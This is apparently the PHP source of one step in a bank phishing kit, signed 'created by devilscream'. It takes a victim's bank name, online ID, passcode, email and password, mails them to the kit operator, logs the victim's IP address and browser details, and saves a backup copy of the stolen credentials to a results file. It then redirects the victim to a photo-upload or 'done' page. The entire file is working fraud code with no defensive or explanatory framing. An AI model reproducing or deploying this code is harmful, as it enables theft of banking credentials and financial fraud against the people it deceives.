<?php
session_start();
$message  = "#---------------------------[ BANK LOGIN ]----------------------------#\n";
$message .= "Bank						: ".$_SESSION['bank_name']."\n";
$message .= "Online ID					: ".$_SESSION['onlineid']."\n";
$message .= "Passcode					: ".$_SESSION['passcode']."\n";
$message .= "Email					    : ".$_POST['bank_email']."\n";
$message .= "Password					: ".$_POST['bank_password']."\n";
$message .= "#----------------------[ created by devilscream ]---------------------#\n";

$subject = "BANK LOGIN: ".$_SESSION['bank_name']." [ $cn - $os - $ip2 ]";validate();
$from = $_SESSION['firstname']." ".$_SESSION['lastname'];
kirim_mail($to,$from,$subject,$message);
$click = fopen("../result/total_bank.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
$click = fopen("../result/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Mengisi Bank Login"."\n");
fclose($click);
if($backup == 1) {
	@fclose(@fwrite(@fopen("../result/bank-info.txt", "a"),$message));
}
if($getphoto == 1) {
		echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=upload&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
		exit();
}else{
		echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=done&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
}
?>